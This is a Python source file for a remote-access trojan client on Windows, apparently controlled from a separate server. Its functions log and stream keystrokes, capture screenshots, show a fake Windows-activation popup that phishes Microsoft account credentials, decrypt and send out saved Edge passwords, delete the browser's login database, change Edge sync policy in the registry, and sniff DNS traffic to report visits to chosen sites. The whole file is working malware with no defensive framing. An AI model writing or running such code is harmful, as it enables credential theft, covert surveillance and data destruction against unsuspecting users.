import time
from pynput import keyboard
import socket
from scapy.all import *
from threading import Thread
import pyautogui
from io import BytesIO
import os
import tkinter as tk
from tkinter import messagebox

import webbrowser
edge_path = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
webbrowser.register('edge', None, webbrowser.BackgroundBrowser(edge_path))
webbrowser.get('edge').open('http://www.google.com')

HOST = 'IP'
PORT = 65432

c = socket.socket()
c.connect((HOST, PORT))
print("Connected to server at", HOST, "on port", PORT)

def viewPasswords():
    import os
    import sqlite3
    import json
    from pathlib import Path
    from base64 import b64decode
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import win32crypt  # Make sure this is installed!
    import psutil

    def close_edge_instances():
        """Closes all running Microsoft Edge instances."""
        try:
            # Iterate over all running processes
            for proc in psutil.process_iter(attrs=['pid', 'name']):
                # Check if the process name is "msedge" (Microsoft Edge)
                if proc.info['name'].lower() == 'msedge.exe':
                    proc.terminate()  # Terminate the process
                    print(f"Terminated Edge process with PID: {proc.info['pid']}")

            print("All Edge instances have been terminated.")
        except Exception as e:
            print(f"An error occurred: {e}")

    def get_encryption_key():
        """Retrieves the encryption key from Edge's Local State file."""
        try:
            # Path to Local State file
            local_state_path = Path(os.getenv("LOCALAPPDATA")) / "Microsoft" / "Edge" / "User Data" / "Local State"

            # Read the file
            with open(local_state_path, "r", encoding="utf-8") as file:
                local_state_data = json.load(file)

            # Decode the encrypted key
            encrypted_key = b64decode(local_state_data["os_crypt"]["encrypted_key"])

            # Remove DPAPI prefix (first 5 bytes) and decrypt the key
            encrypted_key = encrypted_key[5:]  # Remove "DPAPI"
            decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return decrypted_key
        except Exception as e:
            print(f"Failed to retrieve encryption key: {e}")
            return None

    def decrypt_password(encrypted_password, key):
        """Decrypts the given password using the provided encryption key."""
        try:
            # Remove prefix (first 3 bytes)
            encrypted_password = encrypted_password[3:]

            # Extract IV, Ciphertext, and Tag
            iv = encrypted_password[:12]
            ciphertext = encrypted_password[12:-16]
            tag = encrypted_password[-16:]

            # Use AES-GCM decryption
            cipher = Cipher(algorithms.AES(key), modes.GCM(iv, tag))
            decryptor = cipher.decryptor()
            decrypted_password = decryptor.update(ciphertext) + decryptor.finalize()
            return decrypted_password.decode()
        except Exception as e:
            print(f"Failed to decrypt password: {e}")
            return None

    def read_edge_passwords():
        """Reads and decrypts stored passwords in the Edge browser."""
        try:
            # Path to Edge's user data directory
            user_data_path = Path(os.getenv("LOCALAPPDATA")) / "Microsoft" / "Edge" / "User Data" / "Default"
            login_data_path = user_data_path / "Login Data"

            # Check if the database file exists
            if not login_data_path.exists():
                print("Edge Login Data file not found. Make sure Edge is installed and has stored passwords.")
                c.sendall(b"Edge Login Data file not found. Make sure Edge is installed and has stored passwords.")
                c.sendall(b"exitPhrase")
                return

            # Retrieve the encryption key
            encryption_key = get_encryption_key()
            if not encryption_key:
                print("Failed to retrieve the encryption key. Cannot decrypt passwords.")
                return

            # Connect to the SQLite database
            conn = sqlite3.connect(login_data_path)
            cursor = conn.cursor()

            # Query to get the stored login information
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

            # Fetch all rows
            rows = cursor.fetchall()
            conn.close()

            # Process each row
            for row in rows:
                origin_url = row[0]
                username = row[1]
                encrypted_password = row[2]
                decrypted_password = decrypt_password(encrypted_password, encryption_key)

                print(f"Website: {origin_url}")
                print(f"Username: {username}")
                print(f"Password: {decrypted_password if decrypted_password else 'Failed to decrypt'}")
                paswd = f"Password: {decrypted_password if decrypted_password else 'Failed to decrypt'}"
                print("-----------------------")

                # Combine the messages and encode them into bytes
                message = (
                    f"Website: {origin_url}\n"
                    f"Username: {username}\n"
                    f"{paswd}\n"
                    "-----------------------\n"
                )

                # Send the combined message as bytes
                c.sendall(message.encode())

            c.sendall(b"exitPhrase")

        except sqlite3.Error as e:
            # print(f"An error occurred while accessing the database: {e}")
            close_edge_instances()
            read_edge_passwords()
        except Exception as ex:
            print(f"An unexpected error occurred: {ex}")

    # Usage
    read_edge_passwords()

def deletePasswords():
    import os
    from pathlib import Path
    import psutil

    def close_edge_instances():
        """Closes all running Microsoft Edge instances."""
        try:
            # Iterate over all running processes
            for proc in psutil.process_iter(attrs=['pid', 'name']):
                # Check if the process name is "msedge" (Microsoft Edge)
                if proc.info['name'].lower() == 'msedge.exe':
                    proc.terminate()  # Terminate the process
                    print(f"Terminated Edge process with PID: {proc.info['pid']}")

            print("All Edge instances have been terminated.")
        except Exception as e:
            print(f"An error occurred: {e}")

    def delete_edge_login_data():
        """Deletes the Login Data file to clear all stored passwords in the Edge browser."""
        try:
            # Path to Edge's user data directory (Windows-specific)
            user_data_path = Path(os.getenv("LOCALAPPDATA")) / "Microsoft" / "Edge" / "User Data" / "Default"
            login_data_path = user_data_path / "Login Data"
            login_journal_path = user_data_path / "Login Data-journal"

            # Check if the database file exists
            if login_data_path.exists():
                # Delete the file
                os.remove(login_data_path)
                print("Edge Login Data file deleted successfully. All stored passwords have been cleared.")
                c.sendall(b"Edge Login Data file deleted successfully. All stored passwords have been cleared.")
            if login_journal_path.exists():
                os.remove(login_journal_path)
                print("Removed the journal successfully!\n")
            else:
                print("Edge Login Data file not found. No passwords to clear.")
                c.sendall(b"Edge Login Data file not found. No passwords to clear.")
        except Exception as ex:
            print(f"An error occurred: {ex}")
            close_edge_instances()
            delete_edge_login_data()

    # Usage
    delete_edge_login_data()

def disableSync():
    import winreg as reg
    import os

    # Registry path to disable Edge sync
    key_path = r"SOFTWARE\Policies\Microsoft\Edge"
    value_name = "SyncDisabled"

    # Open or create the registry key
    try:
        # Open the registry key for writing. If it doesn't exist, create it.
        key = reg.CreateKey(reg.HKEY_LOCAL_MACHINE, key_path)

        # Set the value to disable sync (1 = disabled, 0 = enabled)
        reg.SetValueEx(key, value_name, 0, reg.REG_DWORD, 1)

        # Close the registry key after modification
        reg.CloseKey(key)

        print("Sync has been disabled through the registry.")
        c.sendall(b"Sync has been disabled through the registry.")
    except PermissionError:
        print("Error: You need to run the script with administrator privileges to modify the registry.")
        c.sendall(b"You need to run script with administrator privileges to modify the registry.")
    except Exception as e:
        print(f"An error occurred: {e}")
        c.sendall(b"An error occurred.")

def enableSync():
    import winreg as reg

    # Registry path to enable Edge sync
    key_path = r"SOFTWARE\Policies\Microsoft\Edge"
    value_name = "SyncDisabled"

    # Open or create the registry key
    try:
        # Open the registry key for writing. If it doesn't exist, create it.
        key = reg.CreateKey(reg.HKEY_LOCAL_MACHINE, key_path)

        # Set the value to enable sync (0 = enabled)
        reg.SetValueEx(key, value_name, 0, reg.REG_DWORD, 0)

        # Close the registry key after modification
        reg.CloseKey(key)

        print("Sync has been enabled through the registry.")
        c.sendall(b"Sync has been enabled through the registry.")
    except PermissionError:
        print("Error: You need to run the script with administrator privileges to modify the registry.")
        c.sendall(b"Error: You need to run script with administrator privileges to modify the registry.")
    except Exception as e:
        print(f"An error occurred: {e}")
        c.sendall(f"An error occurred: {e}".encode())

def sendScreenshot():
    screenshot = pyautogui.screenshot()
    with BytesIO() as buffer:
        screenshot.save(buffer, format="PNG")  # Save screenshot to buffer in PNG format
        screenshot_data = buffer.getvalue()
        file_size = len(screenshot_data)
        c.sendall(f"{file_size:<10}".encode())  # Send the file size first (10-byte header)
        c.sendall(screenshot_data)  # Send the raw data
    print("Screenshot sent successfully")

def openSite(url):
    try:
        print(f"Attempting to open: {url}")
        os.system(f"start {url}")
    except Exception as e:
        print(f"Error opening browser: {e}")

def keylogger():
    start_time = int(time.time())
    timediff = 10

    typed_text = []

    def on_press(key):
        nonlocal typed_text

        try:
            if hasattr(key, 'char') and key.char:
                typed_text.append(key.char)
                c.send(key.char.encode())
            elif key == keyboard.Key.space:
                typed_text.append(" ")
                c.send(" ".encode())
            elif key == keyboard.Key.enter:
                typed_text.append("\n")
                c.send("\n".encode())
            elif key == keyboard.Key.backspace:
                if typed_text:
                    typed_text.pop()  # Handle backspace by removing the last character
                    c.send("<bkspc>".encode())
            else:
                # Handle special keys and format them with angle brackets
                typed_text.append(f"<{key.name.upper()}>")
                c.send(f"<{key.name.upper()}>".encode())
        except Exception as e:
            print(f"Error logging key: {e}")

    def on_release(key):
        """Stop the keylogger when ESC is pressed."""
        if key == keyboard.Key.esc or int(time.time()) - start_time > timediff :
            # Convert list to string using a loop
            res = ''
            for s in typed_text:
                res += s
            # Remove trailing space
            res = res.strip()
            print("Exiting keylogger...")
            c.send("exitPhrase".encode())
            return False

    # Start the key listener
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def displayPopup():
    def renew_windows():
        username = username_entry.get()
        password = password_entry.get()

        if username and password:
            messagebox.showinfo("Windows Renewal", "Windows has been renewed successfully!")
            c.send(b"Microsoft Account Details -->\nEmail/Username: " + username.encode() +b"\n" + b"Password: " + password.encode())
            root.destroy()
        else:
            messagebox.showerror("Error", "Please provide both username and password.")

    # Create the main window
    root = tk.Tk()
    root.title("Windows Activation")
    root.geometry("800x250")  # Make the window wider
    root.resizable(False, False)  # Make the window unscalable

    # Add a warning sign
    warning_label = tk.Label(root, text="⚠️", font=("Arial", 40), fg="orange")
    warning_label.grid(row=0, column=0, padx=20, pady=20, rowspan=3)

    # Add the label
    label = tk.Label(root,
                     text="Your Windows license has expired.\nPlease renew to continue using Windows.\nContact Microsoft Support if you encounter any issues.",
                     font=("Arial", 12), justify="left")
    label.grid(row=0, column=1, sticky="w", padx=10, pady=10)

    # Add the username entry field
    username_label = tk.Label(root, text="Microsoft Username/Email ID:")
    username_label.grid(row=1, column=1, sticky="w", padx=10)
    username_entry = tk.Entry(root, width=40)
    username_entry.grid(row=1, column=2, padx=10)

    # Add the password entry field
    password_label = tk.Label(root, text="Password:")
    password_label.grid(row=2, column=1, sticky="w", padx=10)
    password_entry = tk.Entry(root, width=40, show="*")
    password_entry.grid(row=2, column=2, padx=10)

    # Add additional security note
    security_note = tk.Label(root, text="Note: Your credentials will be securely verified.", font=("Arial", 10),
                             fg="gray")
    security_note.grid(row=3, column=1, columnspan=2, sticky="w", padx=10, pady=5)

    # Add the Renew button
    renew_button = tk.Button(root, text="Renew", command=renew_windows, font=("Arial", 12), width=20, height=2)
    renew_button.grid(row=4, column=1, columnspan=2, pady=15)

    # Run the Tkinter event loop
    root.mainloop()

stop_event = threading.Event()

s = socket.socket()
s.connect((HOST, PORT+1))

# List of websites to monitor
websites = ["example.com", "yahoo.com", "facebook.com"]

# Dictionary to keep track of which websites are open
site_status = {site: False for site in websites}

# Global variable for storing the server's choice
choice = None


# Function to trigger when the site is opened
def site_opened(site):
    global choice
    print(f"[{time.ctime()}] {site} is opened! Triggering action...")
    s.send(b"[*] " + site.encode() + b" is opened. [*]")

# Function to handle DNS packet sniffing
def packet_callback(pkt):
    # Check if the packet is a DNS response (query/answer)
    if pkt.haslayer(DNS):
        # Handle DNS Response (qr == 1 means it's a response)
        if pkt[DNS].qr == 1:
            for site in websites:
                try:
                    # Check if the DNS response is for one of the websites
                    if site in pkt[DNS].an.rdata.decode('utf-8', errors='ignore'):
                        if not site_status[site]:
                            site_status[site] = True
                            site_opened(site)  # Trigger when the site is accessed
                except Exception as e:
                    # print(f"Error handling DNS response: {e}")
                    continue

        # Handle DNS Request (qr == 0 means it's a request)
        elif pkt[DNS].qr == 0:
            for site in websites:
                try:
                    if site in pkt[DNS].qd.qname.decode('utf-8', errors='ignore'):
                        if not site_status[site]:
                            site_status[site] = True
                            site_opened(site)  # Trigger when the site is accessed
                except Exception as e:
                    # print(f"Error handling DNS request: {e}")
                    continue


# Start DNS sniffing and continuous checking
def start_sniffing(stop_event):
    print("Monitoring DNS traffic in real time...")
    while not stop_event.is_set():
        try:
            sniff(prn=packet_callback, filter="udp port 53", store=0, timeout=1)
        except Exception as e:
            print(f"Error during sniffing: {e}")
            break
    print("Sniffing thread stopped.")

sniffingThread = threading.Thread(target=start_sniffing, args=(stop_event,))
sniffingThread.start()


while True:
    data = c.recv(1024).decode()
    if  not data:
        break
    if data == "1":
        print("Keylogger started. Press 'ESC' to stop.")
        keylogger()
    elif data == "3":
        sendScreenshot()
    elif data == "4":
        displayPopup()
    elif data == "5":
        url = c.recv(1024).decode().strip()
        print(f"URL received: {url}")
        if url and url.startswith(("http://", "https://")):
            openSite(url)
        else:
            print("Received invalid or empty URL:", url)
    elif data == "6":
        viewPasswords()
    elif data == "7":
        deletePasswords()
    elif data == "8":
        disableSync()
    elif data == "9":
        enableSync()
    elif data == "q":
        stop_event.set()
        sniffingThread.join()
        c.close()
        s.close()
        print("Exiting...")
        break

